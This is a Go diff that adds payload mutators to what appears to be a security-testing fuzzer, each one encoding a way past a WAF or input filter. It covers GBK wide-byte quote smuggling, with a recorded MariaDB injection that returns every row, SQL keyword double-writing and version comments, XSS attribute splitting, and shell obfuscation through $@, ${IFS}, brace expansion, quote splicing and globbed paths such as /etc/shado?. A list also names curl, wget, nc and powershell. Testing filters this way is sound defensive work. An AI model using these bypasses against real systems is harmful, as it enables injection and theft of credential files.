@@ -39,6 +39,23 @@ var Mutators = []Mutator{
 		Apply: func(s string) string { return url.QueryEscape(url.QueryEscape(s)) },
 	},
 	{
+		Name: "sql-widebyte-quote", Family: "encoding", Weight: 11, ProducesEncoded: true,
+		Kinds: []Kind{SQLi},
+		Apply: func(s string) string {
+			// On a GBK connection the two bytes 0xdf 0x27 are one character to the
+			// escaping routine and two to the parser: the backslash the application
+			// inserts becomes the second byte of a character, and the quote survives
+			// to close the string. The bytes have to arrive as they are, so the whole
+			// payload is returned in transport form with the lead byte written out
+			// beside the encoded quote.
+			//
+			// Measured on MariaDB 11.8 over a GBK connection: the escaped statement
+			// `... username = 'admin<0xdf><backslash>' or 1=1-- -'` returns every row,
+			// where the same statement without the lead byte returns none.
+			return strings.ReplaceAll(url.QueryEscape(s), "%27", "%df%27")
+		},
+	},
+	{
 		Name: "unicode-escape", Excludes: []Kind{XSS}, Family: "encoding", Weight: 13,
 		Apply: mapChars(map[byte]string{
 			'\'': `\u0027`, '"': `\u0022`, '<': `\u003c`, '>': `\u003e`,
@@ -148,10 +165,47 @@ var Mutators = []Mutator{
 		},
 	},
 	{
+		// A filter that removes a keyword once, rather than refusing the request, turns this
+		// back into the keyword: `SELSELECTECT` loses the inner `SELECT` and what is left is
+		// what the query needed. Removing-once is what a sanitiser written as a single
+		// replacement does — a WAF rule that matches the first occurrence, for instance.
+		//
+		// The keywords are the ones long enough to survive being split and the ones that do
+		// not sit inside another word: `OR` is left out because two letters of it would chew
+		// the middle out of `ORDER`.
+		Name: "keyword-double-write", Family: "sql-keyword", Weight: 39,
+		Kinds: []Kind{SQLi},
+		Apply: func(s string) string {
+			out := s
+			for _, keyword := range []string{"UNION", "SELECT", "AND", "SLEEP"} {
+				out = insertInKeyword(keyword, keyword)(out)
+			}
+			return out
+		},
+	},
+	{
 		Name: "terminator-to-block", Family: "sql-terminator", Weight: 40,
 		Kinds: []Kind{SQLi},
 		Apply: func(s string) string {
 			return strings.ReplaceAll(s, "-- -", "/*")
+		},
+	},
+	{
+		// MySQL and MariaDB execute what a version comment contains, so a keyword inside one
+		// still parses while a filter looking at the words does not see the clause it was
+		// written for: `UNION SELECT` becomes `/*!50000UNION*/ /*!50000SELECT*/`, and a rule
+		// matching the two together — which is what such a rule has to do to avoid matching
+		// either word on its own — no longer matches. The version number is the point: 50000
+		// runs on anything modern, and a number nobody runs turns the whole clause into an
+		// ordinary comment instead.
+		Name: "sql-version-comment", Family: "sql-keyword", Weight: 42,
+		Kinds: []Kind{SQLi},
+		Apply: func(s string) string {
+			out := s
+			for _, keyword := range []string{"UNION", "SELECT", "SLEEP", "BENCHMARK"} {
+				out = replaceWholeWord(out, keyword, "/*!50000"+keyword+"*/")
+			}
+			return out
 		},
 	},
 	{
@@ -246,6 +300,17 @@ var Mutators = []Mutator{
 		},
 	},
 	{
+		Name: "tag-split-slash", Family: "xss-split", Weight: 58,
+		Kinds: []Kind{XSS},
+		Apply: func(s string) string {
+			// `/` separates attributes exactly as a space does, so the payload
+			// still parses while a signature looking for " onerror=" or
+			// " onfocus=" no longer matches it — and a filter that strips
+			// whitespace inside a tag leaves this form working.
+			return strings.ReplaceAll(s, " ", "/")
+		},
+	},
+	{
 		Name: "javascript-alert-variant", Family: "xss-js", Weight: 55,
 		Kinds: []Kind{XSS},
 		Apply: func(s string) string {
@@ -337,22 +402,90 @@ var Mutators = []Mutator{
 
 	// -------------------------------------------------------------- command
 	{
+		// The command name itself, split around `$@` — which expands to nothing outside a
+		// function, so the shell still reads the command while a filter matching the word as
+		// written does not. It is the shape that defeats a list of names, and a list of names
+		// is what such a filter is: `cat`, `whoami`, `id`.
+		Name: "cmd-split-command-name", Family: "cmd-name", Weight: 78,
+		Kinds: []Kind{Command},
+		Apply: splitCommandNames,
+	},
+	{
 		Name: "cmd-space-to-ifs", Family: "cmd-space", Weight: 70,
 		Kinds: []Kind{Command},
 		Apply: replaceAll(" ", "$IFS"),
 	},
 	{
-		Name: "cmd-space-to-brace", Family: "cmd-space", Weight: 71,
+		Name: "cmd-space-to-ifs-brace", Family: "cmd-space", Weight: 71,
+		Kinds: []Kind{Command},
+		Apply: replaceAll(" ", "${IFS}"),
+	},
+	{
+		Name: "cmd-brace-expansion", Family: "cmd-space", Weight: 72,
 		Kinds: []Kind{Command},
 		Apply: func(s string) string {
-			// `{cat,/etc/passwd}` runs without a space at all.
-			return replaceAll(" ", "{,")(s)
+			// `{cat,/etc/passwd}` runs the same command with no space anywhere in
+			// it: the shell expands the comma-separated list into separate words.
+			// The arguments come from the last command in the payload, which is
+			// the one the injection reaches.
+			index := strings.LastIndex(s, ";")
+			if index < 0 {
+				return s
+			}
+			fields := strings.Fields(s[index+1:])
+			if len(fields) < 2 {
+				return s
+			}
+			return s[:index+1] + "{" + strings.Join(fields, ",") + "}"
 		},
 	},
 	{
-		Name: "cmd-space-to-tab", Family: "cmd-space", Weight: 72,
+		Name: "cmd-space-to-tab", Family: "cmd-space", Weight: 73,
 		Kinds: []Kind{Command},
 		Apply: replaceAll(" ", "\t"),
+	},
+	{
+		Name: "cmd-glob-path", Family: "cmd-path", Weight: 74,
+		Kinds: []Kind{Command},
+		Apply: func(s string) string {
+			// `cat /etc/pass?d` reads the same file. The shell expands the glob
+			// before the command runs, so a rule that matches the path literally —
+			// or a signature that keys on it — is looking for a path that is not
+			// there.
+			for _, spelling := range cmdGlobPaths {
+				if strings.Contains(s, spelling[0]) {
+					return strings.Replace(s, spelling[0], spelling[1], 1)
+				}
+			}
+			return s
+		},
+	},
+	{
+		Name: "cmd-quote-splice", Family: "cmd-lex", Weight: 75,
+		Kinds: []Kind{Command},
+		Apply: func(s string) string {
+			// `c''at` is `cat`: the shell joins the word after removing the empty
+			// quotes, so the command name never appears as one piece.
+			return spliceFirstWord(s)
+		},
+	},
+	{
+		Name: "cmd-fuse-ifs-glob", Family: "cmd-fuse", Weight: 76,
+		Kinds: []Kind{Command},
+		Apply: func(s string) string {
+			// Both hiding tricks in one payload: `${IFS}` for the space and `?` for
+			// a character of the path. A rule written against the literal form has
+			// to defeat both of them to see this one, and the shell expands both
+			// back before the command runs.
+			out := s
+			for _, spelling := range cmdGlobPaths {
+				if strings.Contains(out, spelling[0]) {
+					out = strings.Replace(out, spelling[0], spelling[1], 1)
+					break
+				}
+			}
+			return strings.ReplaceAll(out, " ", "${IFS}")
+		},
 	},
 	{
 		Name: "cmd-separator-to-newline", Family: "cmd-sep", Weight: 73,
@@ -482,13 +615,100 @@ var Mutators = []Mutator{
 
 	// ------------------------------------------------------------ structural
 	{
-		Name: "base64-wrap", Excludes: []Kind{XSS}, Family: "encoding", Weight: 18,
+		// Excluded from commands as well as XSS: a shell does not decode base64 or
+		// hex, so the variant could only ever reach a target that decodes the value
+		// itself — and spending a generation's budget on it costs the mutations that
+		// do work.
+		Name: "base64-wrap", Excludes: []Kind{XSS, Command}, Family: "encoding", Weight: 18,
 		Apply: func(s string) string { return base64.StdEncoding.EncodeToString([]byte(s)) },
 	},
 	{
-		Name: "hex-encode-all", Excludes: []Kind{XSS}, Family: "encoding", Weight: 19,
+		Name: "hex-encode-all", Excludes: []Kind{XSS, Command}, Family: "encoding", Weight: 19,
 		Apply: func(s string) string { return hex.EncodeToString([]byte(s)) },
 	},
+}
+
+// cmdGlobPaths are spellings a shell expands to the same file. A filter that
+// blocks the literal path has blocked a spelling of it, not the file — which is
+// what makes `cat /etc/pass?d` worth sending.
+// cmdSplittableNames are the commands a filter is likely to be written for.
+var cmdSplittableNames = []string{
+	"cat", "whoami", "uname", "id", "type", "ls", "dir", "ping", "nslookup", "host",
+	"curl", "wget", "nc", "base64", "powershell",
+}
+
+// splitCommandNames splits each known command name on `$@`, which the shell expands to
+// nothing outside a function: `cat` becomes `c$@at` and runs exactly as before, while a
+// filter that matched the word does not see it.
+func splitCommandNames(s string) string {
+	out := s
+	for _, name := range cmdSplittableNames {
+		split := len(name) / 2
+		out = replaceWholeWord(out, name, name[:split]+"$@"+name[split:])
+	}
+	return out
+}
+
+// isShellWordChar reports whether c continues a word the way a shell and a regular
+// expression agree it does: letters, digits and the underscore. It is wider than
+// isWordLetter on purpose — `id_rsa` is one word to both a shell and `\\b`, and splitting
+// the `id` inside it would turn a file name into something the shell cannot read.
+func isShellWordChar(c byte) bool {
+	return c == '_' || (c >= '0' && c <= '9') || isWordLetter(c)
+}
+
+// replaceWholeWord replaces occurrences of word that stand alone.
+func replaceWholeWord(s, word, replacement string) string {
+	var b strings.Builder
+	for i := 0; i < len(s); {
+		if !isShellWordChar(s[i]) {
+			b.WriteByte(s[i])
+			i++
+			continue
+		}
+		start := i
+		for i < len(s) && isShellWordChar(s[i]) {
+			i++
+		}
+		if segment := s[start:i]; segment == word {
+			b.WriteString(replacement)
+		} else {
+			b.WriteString(segment)
+		}
+	}
+	return b.String()
+}
+
+var cmdGlobPaths = [][2]string{
+	{"/etc/passwd", "/etc/pass?d"},
+	{"/etc/passwd", "/etc/pass*"},
+	{"/etc/shadow", "/etc/shado?"},
+	{"/etc/hosts", "/etc/host?"},
+	{"/bin/sh", "/bin/s?"},
+	{"/windows/win.ini", "/windows/win.in?"},
+}
+
+// spliceFirstWord splits the first word of a payload with empty quotes, so that
+// `sleep` becomes `s”leep`. The shell removes the quotes while joining the word,
+// and a signature looking for the command name does not see it whole.
+func spliceFirstWord(s string) string {
+	start := 0
+	for start < len(s) && !isWordLetter(s[start]) {
+		start++
+	}
+	end := start
+	for end < len(s) && isWordLetter(s[end]) {
+		end++
+	}
+	if end-start < 2 {
+		return s
+	}
+	return s[:start+1] + "''" + s[start+1:]
+}
+
+// isWordLetter reports whether a byte can be part of a command name.
+func isWordLetter(c byte) bool {
+	return (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z')
 }
 
 // MutatorsFor returns the mutators that apply to a kind, ordered by weight.
